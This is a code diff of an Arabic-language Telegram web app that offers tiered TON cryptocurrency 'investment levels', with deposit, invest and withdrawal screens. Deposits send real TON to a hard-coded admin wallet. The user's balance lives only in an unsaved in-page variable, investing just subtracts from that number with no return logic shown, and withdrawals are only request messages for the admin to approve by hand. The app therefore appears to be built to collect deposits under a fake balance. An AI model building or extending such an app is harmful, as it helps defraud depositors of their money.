@@ -224,16 +224,13 @@
         </div>
     </header>
 
-    <!-- الرئيسية: الرصيد الداخلي ومستويات الاستثمار -->
+    <!-- الرئيسية -->
     <div id="tab-home" class="page-view active">
-        
-        <!-- كارت الرصيد الداخلي -->
         <div class="balance-card">
             <div class="balance-title">رصيدك الداخلي المتاح</div>
             <div class="balance-value"><span id="user-balance">0.00</span> TON</div>
         </div>
 
-        <!-- المستوى 1 -->
         <div class="card" id="level-1-card">
             <div class="card-header-title">
                 <span>⚡ الاستثمار - المستوى 1</span>
@@ -250,7 +247,6 @@
             <button class="btn-action" id="btn-lvl-1" onclick="investFromBalance(1, 1)">استثمار من الرصيد الداخلي (1 TON)</button>
         </div>
 
-        <!-- المستوى 2 -->
         <div class="card locked" id="level-2-card">
             <div class="card-header-title">
                 <span>🚀 الاستثمار - المستوى 2</span>
@@ -267,7 +263,6 @@
             <button class="btn-action" id="btn-lvl-2" onclick="investFromBalance(2, 5)" disabled>مغلق (أكمل المستوى 1)</button>
         </div>
 
-        <!-- المستوى 3 -->
         <div class="card locked" id="level-3-card">
             <div class="card-header-title">
                 <span>💎 الاستثمار - المستوى 3</span>
@@ -312,7 +307,7 @@
         </div>
     </div>
 
-    <!-- المحفظة والإيداع والسحب -->
+    <!-- المحفظة -->
     <div id="tab-balance" class="page-view">
         
         <!-- قسم الإيداع -->
@@ -320,7 +315,8 @@
             <div class="card-header-title">📥 الإيداع الشحن</div>
             <p style="font-size: 12px; color: var(--text-sub);">الحد الأدنى للإيداع هو 1 TON</p>
             
-            <input type="number" id="deposit-amount" class="custom-input" placeholder="1" min="1" value="1" oninput="validateMinInput(this)">
+            <!-- تم جعل القيمة فارغة كـ placeholder لتسهيل الكتابة والحذف -->
+            <input type="number" id="deposit-amount" class="custom-input" placeholder="أدخل كمية الإيداع (أقل شيء 1)">
             
             <button class="btn-action" onclick="sendAutoDeposit()">⚡ شحن الرصيد الداخلي</button>
         </div>
@@ -331,12 +327,7 @@
             <p style="font-size: 12px; color: var(--text-sub);">الحد الأدنى للسحب 1 TON - ضريبة السحب 2%</p>
             
             <input type="text" id="withdraw-wallet" class="custom-input" placeholder="عنوان محفظة TON الخاصة بك">
-            <input type="number" id="withdraw-amount" class="custom-input" placeholder="المبلغ (مثال: 1)" min="1" value="1" oninput="validateMinInput(this)">
-            
-            <div class="info-row" style="margin: 5px 0;">
-                <span class="info-label">الخصم الإجمالي (شامل 2%):</span>
-                <span class="info-value" id="net-withdraw-display">1.02 TON</span>
-            </div>
+            <input type="number" id="withdraw-amount" class="custom-input" placeholder="أدخل مبلغ السحب (أقل شيء 1)">
 
             <button class="btn-action" style="background-color: var(--accent-yellow);" onclick="requestWithdrawal()">📤 إرسال طلب السحب للأدمن</button>
         </div>
@@ -366,8 +357,8 @@
     <script>
         const ADMIN_WALLET = "UQBrfxfxzB5-op8FGLs-BxnZgOBv0CveJ8VJbC3Xc9pVXZ5X";
 
-        let internalBalance = 0.00; // الرصيد الداخلي
-        let withdrawSequenceNumber = 1000; // بداية أرقام التوصل للسحب
+        let internalBalance = 0.00;
+        let withdrawSequenceNumber = 1000;
         let isWalletConnected = false;
 
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -383,21 +374,6 @@
             document.getElementById('user-balance').innerText = internalBalance.toFixed(2);
         }
 
-        // منع إدخال أي رقم أقل من 1
-        function validateMinInput(element) {
-            let val = parseFloat(element.value);
-            if (isNaN(val) || val < 1) {
-                element.value = 1;
-            }
-            
-            // حساب الضريبة عند كتابة مبلغ السحب
-            if (element.id === 'withdraw-amount') {
-                let amount = parseFloat(element.value) || 1;
-                let totalWithFee = amount * 1.02; // ضريبة 2%
-                document.getElementById('net-withdraw-display').innerText = totalWithFee.toFixed(2) + " TON";
-            }
-        }
-
         function switchTab(tabId, element) {
             document.querySelectorAll('.page-view').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -405,7 +381,6 @@
             element.classList.add('active');
         }
 
-        // الإيداع الخارجي عبر المحفظة لشحن الرصيد الداخلي
         async function sendAutoDeposit() {
             if (!isWalletConnected) {
                 tonConnectUI.openModal();
@@ -415,7 +390,7 @@
             const amountVal = parseFloat(document.getElementById('deposit-amount').value);
             
             if (isNaN(amountVal) || amountVal < 1) {
-                alert("الحد الأدنى للإيداع هو 1 TON");
+                alert("الحد الأدنى للإيداع هو 1 TON!");
                 return;
             }
 
@@ -431,7 +406,6 @@
 
             try {
                 await tonConnectUI.sendTransaction(transaction);
-                // إضافة المبلغ للرصيد الداخلي فور النجاح
                 internalBalance += amountVal;
                 updateBalanceDisplay();
                 alert(`تم شحن حسابك بنجاح بمبلغ ${amountVal} TON!`);
@@ -440,18 +414,15 @@
             }
         }
 
-        // الاستثمار المباشر من الرصيد الداخلي فقط (بدون محفظة)
         function investFromBalance(level, cost) {
             if (internalBalance < cost) {
                 alert(`رصيدك الداخلي غير كافٍ! تحتاج إلى ${cost} TON للبدء.`);
                 return;
             }
 
-            // خصم القيمة من الرصيد الداخلي
             internalBalance -= cost;
             updateBalanceDisplay();
 
-            // تحديث البطاقات وفتح المستوى التالي
             const currentBtn = document.getElementById(`btn-lvl-${level}`);
             currentBtn.innerText = "نشط حالياً ⚡";
             currentBtn.disabled = true;
@@ -473,11 +444,9 @@
             alert(`تم تفعيل المستوى ${level} بنجاح وخصم ${cost} TON من رصيدك الداخلي!`);
         }
 
-        // إرسال طلب السحب للأدمن مع الرقم التسلسلي والضريبة 2%
         function requestWithdrawal() {
             const walletAddr = document.getElementById('withdraw-wallet').value.trim();
             const amount = parseFloat(document.getElementById('withdraw-amount').value);
-            const totalDeduction = amount * 1.02; // خصم المبلغ + 2% ضريبة
 
             if (!walletAddr) {
                 alert("يرجى إدخال عنوان محفظتك لاستلام الأموال!");
@@ -489,27 +458,26 @@
                 return;
             }
 
+            const totalDeduction = amount * 1.02; // حساب الخصم المطلوب مع الضريبة 2%
+
             if (internalBalance < totalDeduction) {
                 alert(`رصيدك الداخلي غير كافٍ! المبلغ المطلوب مع ضريبة 2% هو ${totalDeduction.toFixed(2)} TON.`);
                 return;
             }
 
-            // خصم المبلغ إدارياً
             internalBalance -= totalDeduction;
             updateBalanceDisplay();
 
-            // توليد الرقم التسلسلي للطلب
             withdrawSequenceNumber++;
             const orderHash = `#WD-${withdrawSequenceNumber}`;
 
-            // إرسال إشعار عبر WebApp
-            const telegramMsg = `طلب سحب جديد ${orderHash}\nالمبلغ: ${amount} TON\nالعنوان: ${walletAddr}`;
+            const telegramMsg = `طلب سحب جديد ${orderHash}\nالمبلغ المطلوب: ${amount} TON\nإجمالي الخصم (مع 2%): ${totalDeduction.toFixed(2)} TON\nالعنوان: ${walletAddr}`;
             
             if (window.Telegram && window.Telegram.WebApp) {
                 window.Telegram.WebApp.sendData(telegramMsg);
             }
 
-            alert(`تم تسجيل طلب السحب بنجاح!\nالرقم التسلسلي: ${orderHash}\nالمبلغ الخالص: ${amount} TON (تم خصم 2% ضريبة)\nسيتم التدقيق والإرسال بواسطة الأدمن قريباً.`);
+            alert(`تم تسجيل طلب السحب بنجاح!\nالرقم التسلسلي: ${orderHash}\nالمبلغ المطلوب: ${amount} TON\nسيتم التدقيق والإرسال بواسطة الأدمن قريباً.`);
         }
     </script>
 </body>
